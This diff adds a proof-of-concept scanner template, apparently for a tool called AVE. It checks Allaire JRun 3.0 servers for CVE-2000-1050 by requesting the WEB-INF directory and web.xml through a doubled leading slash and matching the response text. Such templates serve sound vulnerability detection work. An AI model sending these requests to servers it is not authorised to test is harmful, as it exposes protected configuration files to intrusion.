@@ -1,0 +1,55 @@
+[info]
+author = "AVE"
+description = "检测 Allaire JRun 3.0 HTTP Servlet 服务器是否存在目录泄露漏洞，通过发送带有额外前导斜杠的 URL 请求尝试访问 WEB-INF 目录"
+id = "POC-AVE-2000-0762"
+name = "Allaire JRun 3.0 WEB-INF Directory Disclosure PoC"
+severity = "medium"
+tags = [
+    "cve-2000-1050",
+    "jrun",
+    "directory-disclosure",
+]
+vuln_id = [
+    "CVE-2000-1050",
+    "AVE-2000-0762",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}//WEB-INF/"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "WEB-INF",
+    "Directory",
+    "web.xml",
+    "Listing of",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}//WEB-INF/web.xml"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<web-app",
+    "web.xml",
+    "WEB-INF",
+]
